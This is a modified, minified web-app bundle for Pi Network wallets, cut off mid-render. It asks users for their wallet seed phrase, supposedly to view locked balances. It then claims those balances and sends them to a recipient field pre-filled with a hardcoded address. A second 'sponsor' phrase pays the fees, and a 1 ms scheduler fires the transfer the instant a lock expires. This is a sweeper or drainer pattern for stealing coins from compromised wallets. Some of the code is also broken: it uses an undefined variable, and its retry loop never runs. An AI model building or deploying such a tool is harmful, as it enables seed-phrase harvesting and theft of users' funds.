(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([[974], {
    15340: () => {}
    ,
    15851: (e, s, a) => {
        "use strict";
        a.d(s, {
            Toaster: () => n
        });
        var t = a(95155)
          , r = a(51362)
          , l = a(56671);
        let n = e => {
            let {...s} = e
              , {theme: a="system"} = (0,
            r.D)();
            return (0,
            t.jsx)(l.l$, {
                theme: a,
                className: "toaster group",
                toastOptions: {
                    classNames: {
                        toast: "group toast group-[.toaster]:bg-background group-[.toaster]:text-foreground group-[.toaster]:border-border group-[.toaster]:shadow-lg",
                        description: "group-[.toast]:text-muted-foreground",
                        actionButton: "group-[.toast]:bg-primary group-[.toast]:text-primary-foreground",
                        cancelButton: "group-[.toast]:bg-muted group-[.toast]:text-muted-foreground"
                    }
                },
                ...s
            })
        }
    }
    ,
    47530: (e, s, a) => {
        "use strict";
        a.d(s, {
            default: () => eh
        });
        var t = a(95155)
          , r = a(12115)
          , l = a(32473)
          , n = a(52596)
          , o = a(39688);
        function i() {
            for (var e = arguments.length, s = Array(e), a = 0; a < e; a++)
                s[a] = arguments[a];
            return (0,
            o.QP)((0,
            n.$)(s))
        }
        let c = l.bL
          , d = r.forwardRef( (e, s) => {
            let {className: a, ...r} = e;
            return (0,
            t.jsx)(l.B8, {
                ref: s,
                className: i("inline-flex h-10 items-center justify-center rounded-md bg-muted p-1 text-muted-foreground", a),
                ...r
            })
        }
        );
        d.displayName = l.B8.displayName;
        let u = r.forwardRef( (e, s) => {
            let {className: a, ...r} = e;
            return (0,
            t.jsx)(l.l9, {
                ref: s,
                className: i("inline-flex items-center justify-center whitespace-nowrap rounded-sm px-3 py-1.5 text-sm font-medium ring-offset-background transition-all focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 data-[state=active]:bg-background data-[state=active]:text-foreground data-[state=active]:shadow-sm", a),
                ...r
            })
        }
        );
        u.displayName = l.l9.displayName;
        let m = r.forwardRef( (e, s) => {
            let {className: a, ...r} = e;
            return (0,
            t.jsx)(l.UC, {
                ref: s,
                className: i("mt-2 ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2", a),
                ...r
            })
        }
        );
        m.displayName = l.UC.displayName;
        var f = a(99708)
          , p = a(74466);
        let x = (0,
        p.F)("inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50", {
            variants: {
                variant: {
                    default: "bg-primary text-primary-foreground hover:bg-primary/90",
                    destructive: "bg-destructive text-destructive-foreground hover:bg-destructive/90",
                    outline: "border border-input bg-background hover:bg-accent hover:text-accent-foreground",
                    secondary: "bg-secondary text-secondary-foreground hover:bg-secondary/80",
                    ghost: "hover:bg-accent hover:text-accent-foreground",
                    link: "text-primary underline-offset-4 hover:underline"
                },
                size: {
                    default: "h-10 px-4 py-2",
                    sm: "h-9 rounded-md px-3",
                    lg: "h-11 rounded-md px-8",
                    icon: "h-10 w-10"
                }
            },
            defaultVariants: {
                variant: "default",
                size: "default"
            }
        })
          , h = r.forwardRef( (e, s) => {
            let {className: a, variant: r, size: l, asChild: n=!1, ...o} = e
              , c = n ? f.DX : "button";
            return (0,
            t.jsx)(c, {
                className: i(x({
                    variant: r,
                    size: l,
                    className: a
                })),
                ref: s,
                ...o
            })
        }
        );
        h.displayName = "Button";
        let g = r.forwardRef( (e, s) => {
            let {className: a, type: r, ...l} = e;
            return (0,
            t.jsx)("input", {
                type: r,
                className: i("flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50", a),
                ref: s,
                ...l
            })
        }
        );
        g.displayName = "Input";
        var b = a(40968);
        let v = (0,
        p.F)("text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70")
          , y = r.forwardRef( (e, s) => {
            let {className: a, ...r} = e;
            return (0,
            t.jsx)(b.b, {
                ref: s,
                className: i(v(), a),
                ...r
            })
        }
        );
        y.displayName = b.b.displayName;
        var N = a(78749)
          , j = a(92657)
          , w = a(51154)
          , k = a(43453)
          , A = a(24357)
          , R = a(56671);
        let S = r.forwardRef( (e, s) => {
            let {className: a, ...r} = e;
            return (0,
            t.jsx)("div", {
                ref: s,
                className: i("rounded-lg border bg-card text-card-foreground shadow-sm", a),
                ...r
            })
        }
        );
        S.displayName = "Card";
        let C = r.forwardRef( (e, s) => {
            let {className: a, ...r} = e;
            return (0,
            t.jsx)("div", {
                ref: s,
                className: i("flex flex-col space-y-1.5 p-6", a),
                ...r
            })
        }
        );
        C.displayName = "CardHeader";
        let T = r.forwardRef( (e, s) => {
            let {className: a, ...r} = e;
            return (0,
            t.jsx)("h3", {
                ref: s,
                className: i("text-2xl font-semibold leading-none tracking-tight", a),
                ...r
            })
        }
        );
        T.displayName = "CardTitle",
        r.forwardRef( (e, s) => {
            let {className: a, ...r} = e;
            return (0,
            t.jsx)("p", {
                ref: s,
                className: i("text-sm text-muted-foreground", a),
                ...r
            })
        }
        ).displayName = "CardDescription";
        let B = r.forwardRef( (e, s) => {
            let {className: a, ...r} = e;
            return (0,
            t.jsx)("div", {
                ref: s,
                className: i("p-6 pt-0", a),
                ...r
            })
        }
        );
        function F(e) {
            let {setClaimables: s, setWalletAddress: a, setKeyphrase: l, keyphrase: n, balances: o, handleSubmit: i, loading: c} = e
              , [d,u] = (0,
            r.useState)(!1)
              , [m,f] = (0,
            r.useState)(null)
              , p = e => e.trim()
              , x = (e, s) => {
                navigator.clipboard.writeText(e),
                f(s),
                R.oR.success("Copied to clipboard"),
                setTimeout( () => f(null), 2e3)
            }
            ;
            return (0,
            t.jsxs)("div", {
                className: "space-y-6 animate-in fade-in duration-300",
                children: [(0,
                t.jsxs)("div", {
                    className: "space-y-2",
                    children: [(0,
                    t.jsx)("h2", {
                        className: "text-xl md:text-2xl font-semibold",
                        children: "Lihat Koin Terkunci"
                    }), (0,
                    t.jsx)("p", {
                        className: "text-muted-foreground text-sm",
                        children: "Masukkan frasa kata kunci dompet Anda untuk melihat saldo yang Terkunci"
                    })]
                }), (0,
                t.jsxs)("form", {
                    onSubmit: i,
                    className: "space-y-4",
                    children: [(0,
                    t.jsxs)("div", {
                        className: "space-y-2",
                        children: [(0,
                        t.jsx)(y, {
                            htmlFor: "keyphrase",
                            children: "Frasa Kunci Dompet"
                        }), (0,
                        t.jsxs)("div", {
                            className: "relative",
                            children: [(0,
                            t.jsx)(g, {
                                id: "keyphrase",
                                type: d ? "text" : "password",
                                placeholder: "Enter your keyphrase...",
                                value: n,
                                onChange: e => l(p(e.target.value)),
                                className: "pr-10"
                            }), (0,
                            t.jsx)(h, {
                                type: "button",
                                variant: "ghost",
                                size: "icon",
                                className: "absolute right-0 top-0 h-full",
                                onClick: () => u(!d),
                                children: d ? (0,
                                t.jsx)(N.A, {
                                    size: 18
                                }) : (0,
                                t.jsx)(j.A, {
                                    size: 18
                                })
                            })]
                        })]
                    }), (0,
                    t.jsx)(h, {
                        type: "submit",
                        className: "w-full transition-all",
                        disabled: c || !n,
                        children: c ? (0,
                        t.jsxs)(t.Fragment, {
                            children: [(0,
                            t.jsx)(w.A, {
                                className: "mr-2 h-4 w-4 animate-spin"
                            }), "Fetching..."]
                        }) : "View Locked Balances"
                    })]
                }), o.length > 0 && (0,
                t.jsxs)("div", {
                    className: "space-y-3 mt-6",
                    children: [(0,
                    t.jsx)("h3", {
                        className: "font-medium",
                        children: "Locked Balances"
                    }), (0,
                    t.jsx)("div", {
                        className: "space-y-2",
                        children: o.map( (e, s) => (0,
                        t.jsx)(S, {
                            className: "overflow-hidden hover:shadow-md transition-shadow",
                            children: (0,
                            t.jsx)(B, {
                                className: "p-4",
                                children: (0,
                                t.jsxs)("div", {
                                    className: "flex flex-col space-y-2",
                                    children: [(0,
                                    t.jsxs)("div", {
                                        className: "flex justify-between items-center",
                                        children: [(0,
                                        t.jsxs)("span", {
                                            className: "text-muted-foreground text-sm",
                                            children: ["Balance #", s + 1]
                                        }), (0,
                                        t.jsxs)("span", {
                                            className: "font-semibold text-chart-1",
                                            children: [e.amount, " ", e.asset]
                                        })]
                                    }), (0,
                                    t.jsxs)("div", {
                                        className: "flex items-center justify-between",
                                        children: [(0,
                                        t.jsx)("div", {
                                            className: "truncate mr-2 text-xs sm:text-sm font-mono bg-secondary/50 px-2 py-1 rounded max-w-[200px] sm:max-w-xs",
                                            children: e.id
                                        }), (0,
                                        t.jsx)(h, {
                                            size: "icon",
                                            variant: "ghost",
                                            onClick: () => x(e.id, e.id),
                                            className: "ml-auto flex-shrink-0",
                                            children: m === e.id ? (0,
                                            t.jsx)(k.A, {
                                                size: 18,
                                                className: "text-green-500"
                                            }) : (0,
                                            t.jsx)(A.A, {
                                                size: 18
                                            })
                                        })]
                                    })]
                                })
                            })
                        }, e.id))
                    })]
                })]
            })
        }
        B.displayName = "CardContent",
        r.forwardRef( (e, s) => {
            let {className: a, ...r} = e;
            return (0,
            t.jsx)("div", {
                ref: s,
                className: i("flex items-center p-6 pt-0", a),
                ...r
            })
        }
        ).displayName = "CardFooter";
        var E = a(92138)
          , P = a(44470)
          , z = a(59076)
          , D = a(37481);
        let L = () => new P.Server("https://api.mainnet.minepi.com",{
            allowHttp: !0
        })
          , I = Array(50).fill().map( () => L())
          , _ = () => I[Math.floor(Math.random() * I.length)]
          , O = "Pi Network"
          , K = !1;
        function U(e) {
            let s = z.kw(e)
              , a = D.derivePath("m/44'/314159'/0'", s);
            return P.Keypair.fromRawEd25519Seed(a.key)
        }
        async function V(e) {
            return _().claimableBalances().claimant(e).limit(10).call().then(e => {
                let {records: s} = e;
                return s
            }
            )
        }
        async function W(e) {
            try {
                let s = U(e).publicKey();
                console.log("Menggunakan akun sumber: ".concat(s));
                let a = await V(s);
                if (0 === a.length)
                    throw Error("Tidak ada saldo terkunci ditemukan untuk akun ini");
                console.log("Found ".concat(a.length, " locked balance(s)"));
                let t = [];
                for (let e of a)
                    t.push({
                        id: e.id,
                        amount: e.amount,
                        asset: "PI"
                    });
                return t
            } catch (e) {
                return console.error("Kesalahan memproses klaim dan transfer:", e.message),
                e.response && e.response.data && e.response.data.extras && console.error("Detailed error:", e.response.data.extras),
                []
            }
        }
        async function H(e) {
            let s = U(e).publicKey();
            return {
                balances: await W(e),
                publicKey: s
            }
        }
        async function J(e, s, a) {
            let t = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : null;
            console.log("fee-recipient");
            try {
                let a, r = e.publicKey();
                console.log("Using source account: ".concat(r));
                let l = await _().loadAccount(r)
                  , n = [];
                try {
                    n = [await _().claimableBalances().claimableBalance(t).call()]
                } catch (e) {
                    throw Error("Gagal menemukan saldo yang dapat diklaim dengan ID: ".concat(t))
                }
                if (0 === n.length)
                    throw Error("Tidak ada saldo yang dapat diklaim ditemukan untuk akun ini");
                console.log("Found ".concat(n.length, " claimable balance(s)"));
                try {
                    await _().loadAccount(s)
                } catch (e) {
                    console.log("Akun penerima tidak ada. Perlu dibuat.")
                }
                let o = []
                  , i = n[0];
                if (console.log("Memproses saldo: ".concat(i.id, " (").concat(i.amount, " ").concat(i.asset, ")")),
                "native" === i.asset)
                    a = P.Asset.native();
                else {
                    let[e,s] = i.asset.split(":");
                    a = new P.Asset(e,s)
                }
                let c = new P.TransactionBuilder(l,{
                    fee: await _().fetchBaseFee(),
                    networkPassphrase: O
                });
                for (let e = 0; e < 25; e++)
                    c = c.addOperation(P.Operation.claimClaimableBalance({
                        balanceId: i.id
                    })).addOperation(P.Operation.payment({
                        destination: s,
                        asset: a,
                        amount: i.amount
                    }));
                c.setTimeout(30);
                let d = c.build();
                d.sign(e);
                let u = await _().submitTransaction(d);
                if (!u.hash)
                    return {
                        isSuccess: !1,
                        result: u
                    };
                return u.hash && console.log("Saldo diklaim berhasil! Hash: ".concat(u.hash)),
                o.push(u.hash),
                u.hash && (console.log("Transfer selesai dengan sukses! Hash: ".concat(transferResult.hash)),
                o.push(transferResult.hash),
                K = !0),
                {
                    isSuccess: K = !0,
                    result
                }
            } catch (e) {
                return console.error("Kesalahan memproses klaim dan transfer:", e.message),
                e.response && e.response.data && e.response.data.extras && console.error("Detailed error:", e.response.data.extras),
                {
                    isSuccess: !1,
                    error: e
                }
            }
        }
        // MODIFIKASI: Menambahkan parameter operationCount untuk mengontrol jumlah operasi
        async function M(e, s, a, t, operationCount = 1) { // Default 1 operasi
            try {
                let r, l, n = e.publicKey(), o = s.publicKey();
                console.log("Sponsor account (pays fees): ".concat(n)),
                console.log("Source account (owns balance): ".concat(o)),
                console.log("Recipient: ".concat(a));
                let i = await _().loadAccount(n);
                try {
                    r = await _().claimableBalances().claimableBalance(t).call()
                } catch (e) {
                    throw Error("Failed to find claimable balance with ID: ".concat(t))
                }
                if (console.log("Processing balance: ".concat(r.id, " (").concat(r.amount, " ").concat(r.asset, ")")),
                "native" === r.asset)
                    l = P.Asset.native();
                else {
                    let[e,s] = r.asset.split(":");
                    l = new P.Asset(e,s)
                }
                try {
                    await _().loadAccount(a),
                    console.log("Recipient account verified")
                } catch (e) {
                    throw Error("Recipient account does not exist: ".concat(a))
                }
                let c = await _().fetchBaseFee();
                console.log("Using base fee: ".concat(c, " (paid by sponsor)"));
                let d = new P.TransactionBuilder(i,{
                    fee: c,
                    networkPassphrase: O
                });

                // MODIFIKASI: Loop sekarang menggunakan operationCount yang bisa diatur
                console.log(`Building transaction with ${operationCount} operation(s).`);
                for (let e = 0; e < operationCount; e++) {
                    d.addOperation(P.Operation.claimClaimableBalance({
                        balanceId: r.id,
                        source: o
                    })).addOperation(P.Operation.payment({
                        destination: a,
                        asset: l,
                        amount: r.amount,
                        source: o
                    }));
                }

                (d = d.setTimeout(30).build()).sign(e),
                d.sign(s),
                console.log("Submitting sponsored transaction to Pi Network...");
                let u = await _().submitTransaction(d);
                return console.log(u),
                console.log("Transaction successful! Hash: ".concat(u.hash)),
                u.hash && (console.log("Sponsored claim and transfer completed successfully!"),
                console.log("- Sponsor (".concat(n, ") paid the fees")),
                console.log("- Source (".concat(o, ") claimed and transferred ").concat(r.amount, " ").concat(r.asset)),
                K = !0),
                {
                    isSuccess: K,
                    result: u
                }
            } catch (e) {
                var r, l, n, o;
                return console.error("Error in sponsored claim and transfer:", e.message),
                (null == (l = e.response) || null == (r = l.data) ? void 0 : r.extras) && console.error("Detailed error:", JSON.stringify(e.response.data.extras, null, 2)),
                (null == (o = e.response) || null == (n = o.data) ? void 0 : n.detail) && console.error("Error detail:", e.response.data.detail),
                {
                    isSuccess: !1,
                    error: e
                }
            }
        }
        // MODIFIKASI: Menambahkan parameter operationCount
        async function q(e, s, a, t, operationCount) {
            let r = U(e)
              , l = r.publicKey()
              , n = U(t)
              , o = s.trim().toUpperCase()
              , i = await M(n, r, o, a, operationCount); // Melewatkan operationCount ke fungsi M
            return {
                details: {
                    senderAddress: l,
                    receiverAddress: o
                },
                ...i
            }
        }
        var Y = a(87489);
        let Z = r.forwardRef( (e, s) => {
            let {className: a, orientation: r="horizontal", decorative: l=!0, ...n} = e;
            return (0,
            t.jsx)(Y.b, {
                ref: s,
                decorative: l,
                orientation: r,
                className: i("shrink-0 bg-border", "horizontal" === r ? "h-[1px] w-full" : "h-full w-[1px]", a),
                ...n
            })
        }
        );
        Z.displayName = Y.b.displayName;
        let X = (0,
        p.F)("relative w-full rounded-lg border p-4 [&>svg~*]:pl-7 [&>svg+div]:translate-y-[-3px] [&>svg]:absolute [&>svg]:left-4 [&>svg]:top-4 [&>svg]:text-foreground", {
            variants: {
                variant: {
                    default: "bg-background text-foreground",
                    destructive: "border-destructive/50 text-destructive dark:border-destructive [&>svg]:text-destructive"
                }
            },
            defaultVariants: {
                variant: "default"
            }
        })
          , G = r.forwardRef( (e, s) => {
            let {className: a, variant: r, ...l} = e;
            return (0,
            t.jsx)("div", {
                ref: s,
                role: "alert",
                className: i(X({
                    variant: r
                }), a),
                ...l
            })
        }
        );
        G.displayName = "Alert",
        r.forwardRef( (e, s) => {
            let {className: a, ...r} = e;
            return (0,
            t.jsx)("h5", {
                ref: s,
                className: i("mb-1 font-medium leading-none tracking-tight", a),
                ...r
            })
        }
        ).displayName = "AlertTitle";
        let Q = r.forwardRef( (e, s) => {
            let {className: a, ...r} = e;
            return (0,
            t.jsx)("div", {
                ref: s,
                className: i("text-sm [&_p]:leading-relaxed", a),
                ...r
            })
        }
        );
        Q.displayName = "AlertDescription";
        var $ = a(81918)
          , ee = a(66474)
          , es = a(47863)
          , ea = a(5196);
        let et = $.bL;
        $.YJ;
        let er = $.WT
          , el = r.forwardRef( (e, s) => {
            let {className: a, children: r, ...l} = e;
            return (0,
            t.jsxs)($.l9, {
                ref: s,
                className: i("flex h-10 w-full items-center justify-between rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 [&>span]:line-clamp-1", a),
                ...l,
                children: [r, (0,
                t.jsx)($.In, {
                    asChild: !0,
                    children: (0,
                    t.jsx)(ee.A, {
                        className: "h-4 w-4 opacity-50"
                    })
                })]
            })
        }
        );
        el.displayName = $.l9.displayName;
        let en = r.forwardRef( (e, s) => {
            let {className: a, ...r} = e;
            return (0,
            t.jsx)($.PP, {
                ref: s,
                className: i("flex cursor-default items-center justify-center py-1", a),
                ...r,
                children: (0,
                t.jsx)(es.A, {
                    className: "h-4 w-4"
                })
            })
        }
        );
        en.displayName = $.PP.displayName;
        let eo = r.forwardRef( (e, s) => {
            let {className: a, ...r} = e;
            return (0,
            t.jsx)($.wn, {
                ref: s,
                className: i("flex cursor-default items-center justify-center py-1", a),
                ...r,
                children: (0,
                t.jsx)(ee.A, {
                    className: "h-4 w-4"
                })
            })
        }
        );
        eo.displayName = $.wn.displayName;
        let ei = r.forwardRef( (e, s) => {
            let {className: a, children: r, position: l="popper", ...n} = e;
            return (0,
            t.jsx)($.ZL, {
                children: (0,
                t.jsxs)($.UC, {
                    ref: s,
                    className: i("relative z-50 max-h-96 min-w-[8rem] overflow-hidden rounded-md border bg-popover text-popover-foreground shadow-md data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2", "popper" === l && "data-[side=bottom]:translate-y-1 data-[side=left]:-translate-x-1 data-[side=right]:translate-x-1 data-[side=top]:-translate-y-1", a),
                    position: l,
                    ...n,
                    children: [(0,
                    t.jsx)(en, {}), (0,
                    t.jsx)($.LM, {
                        className: i("p-1", "popper" === l && "h-[var(--radix-select-trigger-height)] w-full min-w-[var(--radix-select-trigger-width)]"),
                        children: r
                    }), (0,
                    t.jsx)(eo, {})]
                })
            })
        }
        );
        ei.displayName = $.UC.displayName,
        r.forwardRef( (e, s) => {
            let {className: a, ...r} = e;
            return (0,
            t.jsx)($.JU, {
                ref: s,
                className: i("py-1.5 pl-8 pr-2 text-sm font-semibold", a),
                ...r
            })
        }
        ).displayName = $.JU.displayName;
        let ec = r.forwardRef( (e, s) => {
            let {className: a, children: r, ...l} = e;
            return (0,
            t.jsxs)($.q7, {
                ref: s,
                className: i("relative flex w-full cursor-default select-none items-center rounded-sm py-1.5 pl-8 pr-2 text-sm outline-none focus:bg-accent focus:text-accent-foreground data-[disabled]:pointer-events-none data-[disabled]:opacity-50", a),
                ...l,
                children: [(0,
                t.jsx)("span", {
                    className: "absolute left-2 flex h-3.5 w-3.5 items-center justify-center",
                    children: (0,
                    t.jsx)($.VF, {
                        children: (0,
                        t.jsx)(ea.A, {
                            className: "h-4 w-4"
                        })
                    })
                }), (0,
                t.jsx)($.p4, {
                    children: r
                })]
            })
        }
        );
        ec.displayName = $.q7.displayName,
        r.forwardRef( (e, s) => {
            let {className: a, ...r} = e;
            return (0,
            t.jsx)($.wv, {
                ref: s,
                className: i("-mx-1 my-1 h-px bg-muted", a),
                ...r
            })
        }
        ).displayName = $.wv.displayName;
        var ed = a(55863);
        let eu = r.forwardRef( (e, s) => {
            let {className: a, value: r, ...l} = e;
            return (0,
            t.jsx)(ed.bL, {
                ref: s,
                className: i("relative h-4 w-full overflow-hidden rounded-full bg-secondary", a),
                ...l,
                children: (0,
                t.jsx)(ed.C1, {
                    className: "h-full w-full flex-1 bg-primary transition-all",
                    style: {
                        transform: "translateX(-".concat(100 - (r || 0), "%)")
                    }
                })
            })
        }
        );
        eu.displayName = ed.bL.displayName;
        let em = (0,
        p.F)("inline-flex items-center rounded-full border px-2.5 py-0.5 text-xs font-semibold transition-colors focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2", {
            variants: {
                variant: {
                    default: "border-transparent bg-primary text-primary-foreground hover:bg-primary/80",
                    secondary: "border-transparent bg-secondary text-secondary-foreground hover:bg-secondary/80",
                    destructive: "border-transparent bg-destructive text-destructive-foreground hover:bg-destructive/80",
                    outline: "text-foreground"
                }
            },
            defaultVariants: {
                variant: "default"
            }
        });
        function ef(e) {
            let {className: s, variant: a, ...r} = e;
            return (0,
            t.jsx)("div", {
                className: i(em({
                    variant: a
                }), s),
                ...r
            })
        }
        function ep(e) {
            let {transaction: s, attempts: a, maxAttempts: r, status: l, errMsg: n=null} = e;
            if (!s)
                return null;
            let {senderAddress: o, receiverAddress: i, amount: c, asset: d} = s;
            return (0,
            t.jsxs)(S, {
                className: "border-border/50 overflow-hidden",
                children: [(0,
                t.jsx)(C, {
                    className: "pb-3",
                    children: (0,
                    t.jsxs)(T, {
                        className: "flex items-center justify-between text-lg",
                        children: [(0,
                        t.jsx)("span", {
                            children: "Transaction Status"
                        }), (0,
                        t.jsxs)(ef, {
                            variant: "processing" === l ? "outline" : "success" === l ? "default" : "destructive",
                            className: "processing" === l ? "bg-secondary" : "success" === l ? "bg-chart-2" : "",
                            children: ["processing" === l && "Processing", "success" === l && "Success", "failed" === l && "Failed"]
                        })]
                    })
                }), (0,
                t.jsxs)(B, {
                    className: "space-y-4",
                    children: [(0,
                    t.jsxs)("div", {
                        className: "space-y-3",
                        children: [(0,
                        t.jsxs)("div", {
                            className: "flex flex-col space-y-1",
                            children: [(0,
                            t.jsx)("span", {
                                className: "text-xs text-muted-foreground",
                                children: "From"
                            }), (0,
                            t.jsx)("span", {
                                className: "text-sm font-mono truncate",
                                children: o
                            })]
                        }), (0,
                        t.jsxs)("div", {
                            className: "flex flex-col space-y-1",
                            children: [(0,
                            t.jsx)("span", {
                                className: "text-xs text-muted-foreground",
                                children: "To"
                            }), (0,
                            t.jsx)("span", {
                                className: "text-sm font-mono truncate",
                                children: i
                            })]
                        }), (0,
                        t.jsxs)("div", {
                            className: "flex flex-col space-y-1",
                            children: [(0,
                            t.jsx)("span", {
                                className: "text-xs text-muted-foreground",
                                children: "Amount"
                            }), (0,
                            t.jsxs)("span", {
                                className: "text-sm font-medium",
                                children: [c, " ", d]
                            })]
                        })]
                    }), "processing" === l && (0,
                    t.jsxs)(t.Fragment, {
                        children: [(0,
                        t.jsxs)("div", {
                            className: "flex items-center justify-between mt-4",
                            children: [(0,
                            t.jsxs)("div", {
                                className: "flex items-center space-x-2",
                                children: [(0,
                                t.jsx)(w.A, {
                                    className: "h-4 w-4 animate-spin text-chart-1"
                                }), (0,
                                t.jsxs)("span", {
                                    className: "text-sm",
                                    children: ["Trying transaction (Attempt ", a, "/", r, ")"]
                                })]
                            }), (0,
                            t.jsxs)("span", {
                                className: "text-xs text-muted-foreground",
                                children: [Math.round(a / r * 100), "%"]
                            })]
                        }), n && (0,
                        t.jsx)("div", {
                            className: "p-3 bg-destructive/10 border border-destructive/20 rounded-md mt-2",
                            children: (0,
                            t.jsx)("p", {
                                className: "text-sm",
                                children: n
                            })
                        }), (0,
                        t.jsx)(eu, {
                            value: a / r * 100,
                            className: "h-2"
                        })]
                    }), "success" === l && (0,
                    t.jsx)("div", {
                        className: "p-3 bg-chart-2/10 border border-chart-2/20 rounded-md mt-2",
                        children: (0,
                        t.jsx)("p", {
                            className: "text-sm",
                            children: "Transaction completed successfully. Funds have been transferred."
                        })
                    }), "failed" === l && (0,
                    t.jsx)("div", {
                        className: "p-3 bg-destructive/10 border border-destructive/20 rounded-md mt-2",
                        children: (0,
                        t.jsx)("p", {
                            className: "text-sm",
                            children: "Transaction failed. Please try again or check wallet details."
                        })
                    })]
                })]
            })
        }
        function ex(e) {
            let {claimables: s, walletAddress: a, setKeyphrase: l, keyphrase: n} = e
            , [o,i] = (0,
            r.useState)("GATQ4UIEVKSVREA6JFP35HOWIKCMTSEH2P7Z36KX5MTKJG5FXNDYUW35")
            , [c,d] = (0,
            r.useState)("")
            , [u,m] = (0,
            r.useState)(!1)
            , [f,p] = (0,
            r.useState)(!1)
            , [x,b] = (0,
            r.useState)(!1)
            , [v,k] = (0,
            r.useState)(null)
            , [sponsorPhrase, setSponsorPhrase] = (0,r.useState)("")
            , [sponsorPhraseVisible, setSponsorPhraseVisible] = (0,r.useState)(!1)
            , [C,T] = (0,
            r.useState)("processing")
            , [B,F] = (0,
            r.useState)(1)
            , [P,z] = (0,
            r.useState)("")
            , [schedule, setSchedule] = (0, r.useState)("")
            , [isScheduled, setIsScheduled] = (0, r.useState)(!1)
            // === TAMBAHAN: State untuk jumlah operasi ===
            , [operationCount, setOperationCount] = (0, r.useState)(1); 
        
            const scheduleCheckInterval = (0, r.useRef)(null);
        
            const D = (e, s) => {
                var a, t, r, l, n, o, i;
                if ((null == e || null == (t = e.extras) || null == (a = t.result_codes) ? void 0 : a.transaction) == "tx_insufficient_balance")
                    return "🔴 SALDO SPONSOR HABIS! Tidak cukup untuk membayar biaya transaksi.";
                if ((null == e || null == (l = e.extras) || null == (r = l.result_codes) ? void 0 : r.transaction) == "tx_bad_seq")
                    return "⚠️ KESALAHAN: Urutan transaksi tidak valid (tx_bad_seq). Coba lagi.";
                if ((null == e || null == (o = e.extras) || null == (n = o.result_codes) ? void 0 : n.transaction) == "tx_failed")
                    return "🚀 Transaksi dikirim, menunggu konfirmasi di jaringan... (tx_failed)";
                if ((null == e ? void 0 : e.status) == 504)
                    return "⏳ STATUS: Server timeout, bot mencoba lagi secara otomatis...";
                if ((null == s || null == (i = s.error) ? void 0 : i.message))
                    return `🔴 GAGAL: Terjadi bentrok transaksi di jaringan. (${s.error.message})`;
                return "🔴 GAGAL: Terjadi kesalahan yang tidak diketahui. Bot terus mencoba."
            };
        
            const executeTransfer = async () => {
                b(true); 
                T("processing");
                F(1);
                setIsScheduled(false);
                
                try {
                    const claimableDetails = findClaimable(c);
                    if (!v) {
                        k({ ...claimableDetails, senderAddress: n ? U(n).publicKey() : 'Menunggu...', receiverAddress: o });
                    }
        
                    // MODIFIKASI: Melewatkan operationCount ke fungsi q
                    let e = await q(n.toLowerCase().trim(), o, c, sponsorPhrase.toLowerCase().trim(), operationCount);
                    z(D(e.result, e));
        
                    let a = 1;
                    while (!e.isSuccess && a < 1) {
                        a++;
                        F(a);
                        // MODIFIKASI: Melewatkan operationCount di setiap percobaan ulang
                        e = await q(n.toLowerCase().trim(), o, c, sponsorPhrase.toLowerCase().trim(), operationCount);
                        if (e.isSuccess) {
                            T("success");
                            z(null);
                            b(false); 
                            return;
                        } else {
                            z(D(e.result, e));
                        }
                    }
        
                    if (e.isSuccess) {
                         T("success");
                         z(null);
                    } else {
                        T("failed");
                    }
                } catch (e) {
                    console.error(e);
                    R.oR.error(e.message || "Gagal memulai transfer");
                    T("failed");
                } finally {
                    b(false);
                }
            };
            
            const handleFormSubmit = async e => {
                e.preventDefault();
                if (!n || !c || !sponsorPhrase) return void R.oR.error("Silakan isi semua kolom: Frasa Pengirim, Frasa Sponsor, dan Saldo Terkunci.");
                
                if (schedule) {
                    const scheduledDate = new Date(schedule);
                    const now = new Date();
        
                    if (scheduledDate <= now) {
                        return void R.oR.error("Waktu jadwal harus di masa depan.");
                    }
                    
                    R.oR.success(`Transfer dijadwalkan untuk: ${scheduledDate.toLocaleString('id-ID', { dateStyle: 'full', timeStyle: 'long' })}`);
                    
                    b(true);
                    setIsScheduled(true);
                    
                    k({ ...findClaimable(c), senderAddress: "DIJADWALKAN", receiverAddress: o });
                    T("processing");
                    z(`Menunggu waktu jadwal: ${scheduledDate.toLocaleString('id-ID')}`);
        
                    if (scheduleCheckInterval.current) {
                        clearInterval(scheduleCheckInterval.current);
                    }
        
                    scheduleCheckInterval.current = setInterval(() => {
                        const currentTime = new Date();
                        if (currentTime.getTime() >= scheduledDate.getTime()) {
                            clearInterval(scheduleCheckInterval.current);
                            R.oR.info("Waktu jadwal telah tiba, memulai transfer...");
                            executeTransfer();
                        }
                    }, 1); 
        
                } else {
                    executeTransfer();
                }
            };
        
            const findClaimable = e => s.find(s => s.id === e);
            const _ = e => e.trim();
        
            (0, r.useEffect)(() => {
                return () => {
                    if (scheduleCheckInterval.current) {
                        clearInterval(scheduleCheckInterval.current);
                    }
                };
            }, []);
        
            return (0,
            t.jsxs)("div", {
                className: "space-y-6 animate-in fade-in duration-300",
                children: [(0,
                t.jsxs)("div", {
                    className: "space-y-2",
                    children: [(0,
                    t.jsx)("h2", {
                        className: "text-xl md:text-2xl font-semibold",
                        children: "Transfer Coins"
                    }), (0,
                    t.jsx)("p", {
